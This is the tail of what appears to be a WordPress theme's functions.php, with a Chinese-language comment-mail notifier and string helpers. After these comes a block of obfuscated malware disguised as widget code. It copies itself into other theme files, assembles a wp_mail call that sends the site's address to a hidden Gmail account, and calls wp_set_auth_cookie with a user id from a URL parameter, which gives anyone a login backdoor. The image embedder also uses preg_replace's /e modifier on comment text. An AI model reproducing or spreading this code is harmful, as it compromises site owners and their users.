       . trim($comment->comment_content) . '<br /></p>

      <p>您可以點擊 <a href="' . htmlspecialchars(get_comment_link($parent_id, array('type' => 'comment'))) . '">查看回應完整內容</a></p>

      <p>歡迎再度光臨 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>

      <p>(此郵件由系統自動發出, 請勿回覆.)</p>

    </div>';

    $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";

    $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";

    wp_mail( $to, $subject, $message, $headers );

    //echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing

  }

}

add_action('comment_post', 'comment_mail_notify');

// -- END ----------------------------------------



 /* Comment Image Embedder */

function embed_images($content) {

  $content = preg_replace('/\[img=?\]*(.*?)(\[\/img)?\]/e', '"<img src=\"$1\" alt=\"" . basename("$1") . "\" />"', $content);

  return $content;

}

add_filter('comment_text', 'embed_images');

// -- END ----------------------------------------



function custom_smilies_src($src, $img){

    return get_bloginfo('template_directory').'/smilies/' . $img;

}

add_filter('smilies_src', 'custom_smilies_src', 10, 2); // 優先級10(默認), 變量2個($src 和 $img)

//文字截断
function cut_str($src_str,$cut_length)
{
$return_str='';
$i=0;
$n=0;
$str_length=strlen($src_str);
while (($n<$cut_length) && ($i<=$str_length))
{
$tmp_str=substr($src_str,$i,1);
$ascnum=ord($tmp_str);
if ($ascnum>=224)
{
$return_str=$return_str.substr($src_str,$i,3);
$i=$i+3;
$n=$n+2;
}
elseif ($ascnum>=192)
{
$return_str=$return_str.substr($src_str,$i,2);
$i=$i+2;
$n=$n+2;
}
elseif ($ascnum>=65 && $ascnum<=90)
{
$return_str=$return_str.substr($src_str,$i,1);
$i=$i+1;
$n=$n+2;
}
else
{
$return_str=$return_str.substr($src_str,$i,1);
$i=$i+1;
$n=$n+1;
}
}
if ($i<$str_length)
{
$return_str = $return_str . '[...]';
}
if (get_post_status() == 'private')
{
$return_str = $return_str . '（private）';
}
return $return_str;
}

/*代码结束 开始狂欢吧By 路柒柒*/?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>